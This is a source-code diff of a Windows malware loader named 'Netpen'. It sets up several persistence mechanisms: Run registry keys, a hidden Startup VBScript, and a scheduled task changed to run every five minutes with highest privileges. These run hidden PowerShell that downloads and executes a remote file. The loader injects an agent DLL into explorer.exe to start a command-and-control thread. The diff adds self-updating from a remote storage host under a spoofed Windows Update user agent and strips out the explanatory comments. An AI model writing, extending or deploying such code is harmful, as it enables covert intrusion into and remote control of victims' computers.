@@ -44,11 +44,66 @@ static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
     return true;
 }
 
+static bool HttpGetToString(const wchar_t* path, std::string& out) {
+    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return false;
+    WinHttpSetTimeouts(hSession, 10000, 10000, 10000, 10000);
+    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    DWORD size = 0;
+    std::string result;
+    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
+        char* buf = new char[size + 1];
+        DWORD downloaded = 0;
+        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
+            result.append(buf, downloaded);
+        delete[] buf;
+    }
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+    out = result;
+    return !result.empty();
+}
+
+static int GetRemoteVersion() {
+    std::string verStr;
+    if (HttpGetToString(L"/storage/v1/object/public/Netpen/version.txt", verStr))
+        return atoi(verStr.c_str());
+    return -1;
+}
+
+static int GetStoredVersion() {
+    HKEY hKey;
+    DWORD ver = 0, sz = sizeof(ver), type = 0;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegQueryValueExA(hKey, "V", NULL, &type, (BYTE*)&ver, &sz);
+        RegCloseKey(hKey);
+    }
+    return (int)ver;
+}
+
+static void SetStoredVersion(int ver) {
+    HKEY hKey;
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD v = (DWORD)ver;
+        RegSetValueExA(hKey, "V", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(hKey);
+    }
+}
+
 static DWORD FindExplorerPid() {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
     DWORD sessionId = 0;
     if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) sessionId = 0;
+    if (sessionId == 0) {
+        typedef DWORD (WINAPI *WTSGACS_t)();
+        WTSGACS_t wts = (WTSGACS_t)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "WTSGetActiveConsoleSessionId");
+        if (wts) sessionId = wts();
+    }
     PROCESSENTRY32W pe = { sizeof(pe) };
     DWORD pid = 0;
     if (Process32FirstW(hSnapshot, &pe)) {
@@ -78,41 +133,39 @@ static bool RunCmd(const std::wstring& cmd) {
 }
 
 static void InstallPersistence() {
-    // Check if already installed
     HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        return;
-    }
-
-    // Mark as installed
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, L"Payload", 0, REG_SZ, (BYTE*)L"1", 4);
-        RegCloseKey(hKey);
-    }
+    bool installed = (RegOpenKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS);
+    if (installed) RegCloseKey(hKey);
 
     std::wstring psCmd = L"powershell -w h -c \"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"";
 
-    // HKCU\Run
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
-        RegCloseKey(hKey);
-    }
-
-    // Startup folder .vbs
-    wchar_t appData[MAX_PATH];
-    if (GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH) > 0) {
-        std::wstring vbsPath = std::wstring(appData) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + std::wstring(NETPEN_FILENAME) + L".update.vbs";
-        std::wstring vbsContent = L"CreateObject(\"WScript.Shell\").Run \"powershell -w h -c \"\"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"\"\", 0, False\r\n";
-        HANDLE hFile = CreateFileW(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD w = 0;
-            WriteFile(hFile, vbsContent.c_str(), (DWORD)(vbsContent.size() * sizeof(wchar_t)), &w, NULL);
-            CloseHandle(hFile);
+    if (!installed) {
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            DWORD one = 1;
+            RegSetValueExA(hKey, "I", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
+            RegCloseKey(hKey);
+        }
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
+            RegCloseKey(hKey);
+        }
+        wchar_t appData[MAX_PATH];
+        if (GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH) > 0) {
+            std::wstring vbsPath = std::wstring(appData) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + std::wstring(NETPEN_FILENAME) + L".update.vbs";
+            std::wstring vbsContent = L"CreateObject(\"WScript.Shell\").Run \"powershell -w h -c \"\"$p=$env:TEMP+'\\" + std::wstring(NETPEN_FILENAME) + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('" + std::wstring(NETPEN_DOWNLOAD_URL) + L"',$p);start $p\"\"\", 0, False\r\n";
+            HANDLE hFile = CreateFileW(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                DWORD w = 0;
+                WriteFile(hFile, vbsContent.c_str(), (DWORD)(vbsContent.size() * sizeof(wchar_t)), &w, NULL);
+                CloseHandle(hFile);
+            }
+        }
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
+            RegCloseKey(hKey);
         }
     }
 
-    // Scheduled Task (ONLOGON)
     std::wstring batDir = L"C:\\ProgramData\\Netpen";
     CreateDirectoryW(batDir.c_str(), NULL);
     std::wstring batFile = batDir + L"\\" + std::wstring(NETPEN_FILENAME) + L".update.bat";
@@ -123,26 +176,24 @@ static void InstallPersistence() {
         WriteFile(hBat, batContent.c_str(), (DWORD)(batContent.size() * sizeof(wchar_t)), &w, NULL);
         CloseHandle(hBat);
     }
-    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + batFile + L"\\\"\" /sc ONLOGON /delay 0000:30 /rl HIGHEST /f";
+    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + batFile + L"\\\"\" /sc MINUTE /mo 5 /rl HIGHEST /f";
     RunCmd(taskCmd);
-
-    // HKLM\Run (if admin)
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, NETPEN_FILENAME, 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)(psCmd.size() * sizeof(wchar_t)) + 2);
-        RegCloseKey(hKey);
-    }
 }
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     InitConfig();
     InstallPersistence();
 
-    // Check if agent is already running inside explorer.exe
+    // Check if agent is alive, and whether an update is needed
     HANDLE hAgentEvent = OpenEventW(SYNCHRONIZE, FALSE, L"NetpenAgentRunning");
-    if (hAgentEvent) {
-        CloseHandle(hAgentEvent);
+    bool agentAlive = (hAgentEvent != NULL);
+    if (hAgentEvent) CloseHandle(hAgentEvent);
+
+    int remoteVer = GetRemoteVersion();
+    int storedVer = GetStoredVersion();
+
+    if (agentAlive && remoteVer >= 0 && remoteVer <= storedVer)
         return 0;
-    }
 
     // Mutex to prevent concurrent injections
     HANDLE hMutex = CreateMutexW(NULL, TRUE, L"NetpenAgentInjection");
@@ -202,7 +253,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1;
     }
 
-    // Find where agent.dll was loaded in the remote process
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
     ULONGLONG remoteDllBase = 0;
     std::wstring dllBaseNameW = dllPathW;
@@ -224,7 +274,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     if (!remoteDllBase) { CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }
 
-    // Load DLL locally to calculate AgentInit RVA
     HMODULE hLocalDll = LoadLibraryW(dllPathW.c_str());
     if (!hLocalDll) { CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }
 
@@ -234,7 +283,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     ULONGLONG rva = (ULONGLONG)localExport - (ULONGLONG)hLocalDll;
     FreeLibrary(hLocalDll);
 
-    // Start AgentInit (spawns C2 thread and returns immediately)
     HANDLE hInitThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(remoteDllBase + rva), NULL, 0, NULL);
     if (!hInitThread) { CloseHandle(hProcess); DeleteFileA(dllPath.c_str()); if (hMutex) CloseHandle(hMutex); return 1; }
 
@@ -244,5 +292,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     DeleteFileA(dllPath.c_str());
     if (hMutex) CloseHandle(hMutex);
+
+    if (remoteVer > 0) SetStoredVersion(remoteVer);
     return 0;
 }
